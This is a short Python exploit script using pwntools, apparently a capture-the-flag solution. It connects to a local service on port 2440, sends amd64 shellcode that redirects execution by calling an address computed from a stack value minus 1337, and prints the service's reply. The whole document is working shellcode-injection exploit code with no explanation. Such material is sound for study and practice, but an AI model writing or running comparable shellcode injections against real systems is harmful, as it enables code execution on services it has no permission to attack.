#!/usr/bin/python3
from pwn import *
context.log_level = 'error'
r = remote("localhost", 2440)
r.readline()

shellcode = asm('\
.global _start;\
_start:;\
.intel_syntax noprefix;\
mov rdi, [rsp+0x20];\
mov rax, [rsp];\
sub rax, 1337;\
call rax;\
ret' , arch = 'amd64', os = 'linux')
r.send(shellcode)
r.readline()
print(r.readline().decode()[:-1])
